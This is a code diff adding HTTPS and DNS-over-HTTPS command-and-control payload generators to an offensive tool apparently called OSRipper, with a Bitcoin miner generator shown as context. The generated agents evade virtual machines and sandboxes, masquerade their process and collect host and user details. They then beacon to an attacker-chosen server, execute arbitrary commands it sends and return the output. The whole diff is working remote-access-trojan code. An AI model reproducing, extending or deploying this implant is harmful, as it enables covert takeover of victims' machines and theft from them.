@@ -171,6 +171,415 @@ time.sleep(random.randint(5, 15))
     return output_name
 
 
+def create_https_payload(base_url, output_name="payload", stealth_delay=False, cert_fingerprint=None, skip_vm_checks=False):
+    """
+    Generate HTTPS C2 payload with certificate pinning.
+    
+    Args:
+        base_url: C2 server base URL (e.g., "https://example.com")
+        output_name: Name of output file
+        stealth_delay: If True, add random delay (5-15 seconds) at startup
+        cert_fingerprint: Certificate SHA256 fingerprint for pinning (optional)
+        skip_vm_checks: If True, skip VM detection checks (for testing)
+    
+    Returns:
+        str: Path to generated payload file
+    """
+    stealth_code = ""
+    if stealth_delay:
+        stealth_code = """import time
+import random
+time.sleep(random.randint(5, 15))
+
+"""
+    
+    # Read agent modules and embed them
+    agent_dir = os.path.join(os.path.dirname(__file__), 'agent')
+    
+    # Read all agent modules
+    modules_code = {}
+    for module_file in ['https_client.py', 'stealth.py', 'executor.py', 'session.py']:
+        module_path = os.path.join(agent_dir, module_file)
+        if os.path.exists(module_path):
+            with open(module_path, 'r') as f:
+                content = f.read()
+                # Remove shebang if present
+                if content.startswith('#!/'):
+                    content = content.split('\n', 1)[1]
+                # Remove module docstring (handle multi-line docstrings)
+                lines = content.split('\n')
+                # Find docstring start (look for """ in any of the first few lines)
+                doc_start = -1
+                doc_end = -1
+                for i, line in enumerate(lines[:10]):  # Check first 10 lines
+                    if '"""' in line:
+                        if doc_start == -1:
+                            doc_start = i
+                        else:
+                            doc_end = i + 1
+                            break
+                if doc_start >= 0 and doc_end > doc_start:
+                    # Remove docstring lines
+                    content = '\n'.join(lines[:doc_start] + lines[doc_end:])
+                elif doc_start >= 0:
+                    # Single line docstring or unclosed, just remove that line
+                    content = '\n'.join(lines[:doc_start] + lines[doc_start+1:])
+                modules_code[module_file] = content
+    
+    cert_pin_code = f', cert_fingerprint="{cert_fingerprint}"' if cert_fingerprint else ''
+    
+    # Build embedded payload
+    payload_content = f"""{stealth_code}# OSRipper HTTPS Agent Payload (Embedded)
+import base64
+import json
+import random
+import time
+import urllib.request
+import urllib.parse
+import ssl
+import socket
+import hashlib
+import os
+import sys
+import platform
+import subprocess
+import psutil
+import secrets
+
+# Embedded HTTPS Client Module
+{modules_code.get('https_client.py', '# HTTPS client code not found')}
+
+# Embedded Stealth Module  
+{modules_code.get('stealth.py', '# Stealth module code not found')}
+
+# Embedded Executor Module
+{modules_code.get('executor.py', '# Executor module code not found')}
+
+# Embedded Session Module
+{modules_code.get('session.py', '# Session module code not found')}
+
+# Main Agent Code
+class Agent:
+    def __init__(self, base_url, stealth_delay=False, cert_fingerprint=None):
+        self.base_url = base_url
+        self.stealth_delay = stealth_delay
+        self.cert_fingerprint = cert_fingerprint
+        self.skip_vm_checks = {skip_vm_checks}
+        self.stealth = Stealth(skip_vm_checks={skip_vm_checks})
+        self.session_manager = SessionManager()
+        self.executor = CommandExecutor()
+        self.https_client = None
+        self.running = False
+        self.system_info_sent = False  # Track if we've sent system info
+        self.is_windows = platform.system() == 'Windows'
+    
+    def _debug_print(self, message):
+        # Debug statements disabled
+        pass
+    
+    def initialize(self):
+        self._debug_print("[*] Initializing agent...")
+        if self.stealth_delay:
+            self._debug_print("[*] Adding stealth delay...")
+            self.stealth.add_delay(5, 15)
+        self._debug_print("[*] Running stealth checks...")
+        if not self.stealth.check_all():
+            self._debug_print("[!] Stealth checks failed, exiting")
+            sys.exit(1)
+        self._debug_print("[+] Stealth checks passed")
+        self.stealth.masquerade_process()
+        self._debug_print("[*] Loading session...")
+        session_id = self.session_manager.load_session()
+        if not session_id:
+            self._debug_print("[*] No existing session, creating new one...")
+            session_id = self.session_manager.create_session()
+        else:
+            self._debug_print("[+] Loaded existing session: " + session_id[:16] + "...")
+        self._debug_print("[*] Creating HTTPS client with base_url: " + self.base_url)
+        self.https_client = HTTPSClient(base_url=self.base_url, session_id=session_id, cert_fingerprint=self.cert_fingerprint)
+        
+        # Collect system information
+        try:
+            self.hostname = platform.node()
+            self.username = os.getenv('USER') or os.getenv('USERNAME') or 'unknown'
+            self.platform_info = platform.platform()
+        except Exception:
+            self.hostname = 'unknown'
+            self.username = 'unknown'
+            self.platform_info = 'unknown'
+        
+        self._debug_print("[+] Agent initialized successfully")
+        return True
+    
+    def run(self):
+        self._debug_print("[*] Starting agent run loop...")
+        if not self.initialize():
+            self._debug_print("[!] Initialization failed")
+            return
+        self.running = True
+        self._debug_print("[+] Agent running, entering main loop...")
+        loop_count = 0
+        while self.running:
+            try:
+                loop_count += 1
+                self._debug_print("[*] Loop iteration " + str(loop_count))
+                # Send system info only on first beacon
+                if not self.system_info_sent:
+                    command = self.https_client.get_command(
+                        hostname=self.hostname,
+                        username=self.username,
+                        platform_info=self.platform_info
+                    )
+                    self.system_info_sent = True
+                else:
+                    command = self.https_client.get_command()
+                if command:
+                    self._debug_print("[+] Processing command: " + str(command))
+                    self._process_command(command)
+                    self.session_manager.update_contact()
+                else:
+                    self._debug_print("[*] No command received")
+                    self.stealth.randomize_timing()
+                delay = self.https_client.get_polling_delay()
+                self._debug_print("[*] Sleeping for " + str(delay) + " seconds...")
+                time.sleep(delay)
+            except KeyboardInterrupt:
+                self._debug_print("[*] Keyboard interrupt received, shutting down...")
+                self.running = False
+                break
+            except Exception as e:
+                self._debug_print("[!] Exception in run loop: " + str(e))
+                import traceback
+                traceback.print_exc()
+                self.session_manager.increment_reconnect()
+                reconnect_delay = self.session_manager.get_reconnect_delay()
+                self._debug_print("[*] Reconnecting in " + str(reconnect_delay) + " seconds...")
+                time.sleep(reconnect_delay)
+    
+    def _process_command(self, command):
+        try:
+            if command == '__TERMINATE__':
+                # Session was deleted - terminate and clean up
+                self.session_manager.clear_session()
+                self.running = False
+                sys.exit(0)
+            elif command == 'exit':
+                self.running = False
+                return
+            elif command == 'ping':
+                self.https_client.send_response('pong')
+                return
+            result = self.executor.execute(command)
+            response = self.executor.format_response(result)
+            self.https_client.send_response(response)
+        except Exception:
+            error_response = "STDERR:Command execution failed"
+            self.https_client.send_response(error_response)
+
+if __name__ == "__main__":
+    print("[*] OSRipper HTTPS Agent starting...")
+    base_url = "{base_url}"
+    stealth_delay = {str(stealth_delay)}
+    cert_fingerprint = {f'"{cert_fingerprint}"' if cert_fingerprint else 'None'}
+    skip_vm_checks = {skip_vm_checks}
+    if platform.system() == 'Windows':
+        print(f"[*] Configuration - Base URL: " + base_url + ", Stealth Delay: " + str(stealth_delay) + ", Cert Fingerprint: " + str(cert_fingerprint) + ", Skip VM Checks: " + str(skip_vm_checks))
+    agent = Agent(base_url=base_url, stealth_delay=stealth_delay, cert_fingerprint=cert_fingerprint)
+    agent.run()
+"""
+    
+    with open(output_name, 'w') as f:
+        f.write(payload_content)
+    
+    return output_name
+
+
+def create_doh_payload(domain, output_name="payload", stealth_delay=False, skip_vm_checks=False):
+    """
+    Generate DNS-over-HTTPS C2 payload.
+    
+    Args:
+        domain: C2 domain name
+        output_name: Name of output file
+        stealth_delay: If True, add random delay (5-15 seconds) at startup
+        skip_vm_checks: If True, skip VM detection checks (for testing)
+    
+    Returns:
+        str: Path to generated payload file
+    """
+    stealth_code = ""
+    if stealth_delay:
+        stealth_code = """import time
+import random
+time.sleep(random.randint(5, 15))
+
+"""
+    
+    # Read agent modules and embed them
+    agent_dir = os.path.join(os.path.dirname(__file__), 'agent')
+    
+    # Read all agent modules
+    modules_code = {}
+    for module_file in ['doh_client.py', 'stealth.py', 'executor.py', 'session.py']:
+        module_path = os.path.join(agent_dir, module_file)
+        if os.path.exists(module_path):
+            with open(module_path, 'r') as f:
+                content = f.read()
+                # Remove shebang if present
+                if content.startswith('#!/'):
+                    content = content.split('\n', 1)[1]
+                # Remove module docstring (triple-quoted string at start)
+                lines = content.split('\n')
+                if lines and '"""' in lines[0]:
+                    # Find end of docstring
+                    doc_end = 0
+                    for i, line in enumerate(lines):
+                        if i > 0 and '"""' in line:
+                            doc_end = i + 1
+                            break
+                    content = '\n'.join(lines[doc_end:])
+                modules_code[module_file] = content
+    
+    # Build embedded payload
+    payload_content = f"""{stealth_code}# OSRipper DoH Agent Payload (Embedded)
+import base64
+import json
+import random
+import time
+import urllib.parse
+import urllib.request
+import ssl
+import os
+import sys
+import platform
+import subprocess
+import psutil
+import secrets
+
+# Embedded DoH Client Module
+{modules_code.get('doh_client.py', '# DoH client code not found')}
+
+# Embedded Stealth Module  
+{modules_code.get('stealth.py', '# Stealth module code not found')}
+
+# Embedded Executor Module
+{modules_code.get('executor.py', '# Executor module code not found')}
+
+# Embedded Session Module
+{modules_code.get('session.py', '# Session module code not found')}
+
+# Main Agent Code
+class Agent:
+    def __init__(self, domain, stealth_delay=False, doh_endpoint=None):
+        self.domain = domain
+        self.stealth_delay = stealth_delay
+        self.doh_endpoint = doh_endpoint
+        self.skip_vm_checks = {skip_vm_checks}
+        self.stealth = Stealth(skip_vm_checks={skip_vm_checks})
+        self.session_manager = SessionManager()
+        self.executor = CommandExecutor()
+        self.doh_client = None
+        self.running = False
+        self.is_windows = platform.system() == 'Windows'
+    
+    def _debug_print(self, message):
+        # Debug statements disabled
+        pass
+    
+    def initialize(self):
+        self._debug_print("[*] Initializing agent...")
+        if self.stealth_delay:
+            self._debug_print("[*] Adding stealth delay...")
+            self.stealth.add_delay(5, 15)
+        self._debug_print("[*] Running stealth checks...")
+        if not self.stealth.check_all():
+            self._debug_print("[!] Stealth checks failed, exiting")
+            sys.exit(1)
+        self._debug_print("[+] Stealth checks passed")
+        self.stealth.masquerade_process()
+        self._debug_print("[*] Loading session...")
+        session_id = self.session_manager.load_session()
+        if not session_id:
+            self._debug_print("[*] No existing session, creating new one...")
+            session_id = self.session_manager.create_session()
+        else:
+            self._debug_print("[+] Loaded existing session: " + session_id[:16] + "...")
+        self.doh_client = DoHClient(domain=self.domain, session_id=session_id, doh_endpoint=self.doh_endpoint)
+        self._debug_print("[+] Agent initialized successfully")
+        return True
+    
+    def run(self):
+        self._debug_print("[*] Starting agent run loop...")
+        if not self.initialize():
+            self._debug_print("[!] Initialization failed")
+            return
+        self.running = True
+        self._debug_print("[+] Agent running, entering main loop...")
+        loop_count = 0
+        while self.running:
+            try:
+                loop_count += 1
+                self._debug_print("[*] Loop iteration " + str(loop_count))
+                command = self.doh_client.get_command()
+                if command:
+                    self._debug_print("[+] Processing command: " + str(command))
+                    self._process_command(command)
+                    self.session_manager.update_contact()
+                else:
+                    self._debug_print("[*] No command received")
+                    self.stealth.randomize_timing()
+                delay = self.doh_client.get_polling_delay()
+                self._debug_print("[*] Sleeping for " + str(delay) + " seconds...")
+                time.sleep(delay)
+            except KeyboardInterrupt:
+                self._debug_print("[*] Keyboard interrupt received, shutting down...")
+                self.running = False
+                break
+            except Exception as e:
+                self._debug_print("[!] Exception in run loop: " + str(e))
+                import traceback
+                traceback.print_exc()
+                self.session_manager.increment_reconnect()
+                reconnect_delay = self.session_manager.get_reconnect_delay()
+                self._debug_print("[*] Reconnecting in " + str(reconnect_delay) + " seconds...")
+                time.sleep(reconnect_delay)
+    
+    def _process_command(self, command):
+        try:
+            if command == '__TERMINATE__':
+                # Session was deleted - terminate and clean up
+                self.session_manager.clear_session()
+                self.running = False
+                sys.exit(0)
+            elif command == 'exit':
+                self.running = False
+                return
+            elif command == 'ping':
+                self.doh_client.send_response('pong')
+                return
+            result = self.executor.execute(command)
+            response = self.executor.format_response(result)
+            self.doh_client.send_response(response)
+        except Exception:
+            error_response = "STDERR:Command execution failed"
+            self.doh_client.send_response(error_response)
+
+if __name__ == "__main__":
+    domain = "{domain}"
+    stealth_delay = {str(stealth_delay)}
+    skip_vm_checks = {skip_vm_checks}
+    # Use C2 server's DoH endpoint
+    doh_endpoint = f"https://{{domain}}/dns-query"
+    agent = Agent(domain=domain, stealth_delay=stealth_delay, doh_endpoint=doh_endpoint)
+    agent.run()
+"""
+    
+    with open(output_name, 'w') as f:
+        f.write(payload_content)
+    
+    return output_name
+
+
 def create_btc_miner_payload(btc_address, output_name="payload", stealth_delay=False):
     """
     Generate Bitcoin miner payload.
